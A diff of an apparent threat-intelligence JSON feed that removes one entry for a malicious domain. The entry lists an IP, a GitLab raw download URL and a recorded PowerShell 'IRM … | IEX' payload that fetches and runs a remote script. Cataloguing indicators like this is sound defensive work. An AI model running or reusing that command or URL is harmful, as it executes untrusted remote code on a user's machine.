@@ -11627,25 +11627,5 @@
     ],
     "ReportId": "cmwj0v9pp16ce0oml2knj3vss",
     "ScannedAt": "2026-11-16T08:49:20.942000+00:00"
-  },
-  {
-    "UrlDomain": "hartmodeyfoundation.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.217.150"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwitstsl15m00omlpia4l632",
-    "ScannedAt": "2026-11-16T05:31:29.471000+00:00"
   }
 ]
